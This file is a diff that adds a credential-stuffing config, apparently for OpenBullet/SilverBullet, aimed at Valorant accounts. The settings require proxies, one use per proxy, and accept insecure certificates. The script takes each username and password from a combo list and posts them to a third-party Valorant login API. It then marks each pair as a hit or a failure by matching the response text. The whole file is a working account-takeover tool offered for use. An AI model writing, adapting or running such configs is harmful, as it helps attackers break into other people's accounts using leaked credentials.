@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "Valorant Priv Api",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T21:02:54.3587778+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Raymond",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Valorant Priv Api",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "USER2" 
+
+REQUEST POST "https://api.checkvalorant.com/login/login" 
+  CONTENT "{\"RitoID\":\"<USER2>\",\"RitoPass\":\"<PASS>\",\"Region\":\"eu\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.checkvalorant.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "sec-ch-ua: \" Not;A Brand\";v=\"99\", \"Google Chrome\";v=\"97\", \"Chromium\";v=\"97\"" 
+  HEADER "Accept: application/json" 
+  HEADER "Content-Type: application/json" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://checkvalorant.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://checkvalorant.com/" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 53" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Your credentials may be wrong" 
+  KEYCHAIN Success OR 
+    KEY "Profile created/updated successfully" 
+
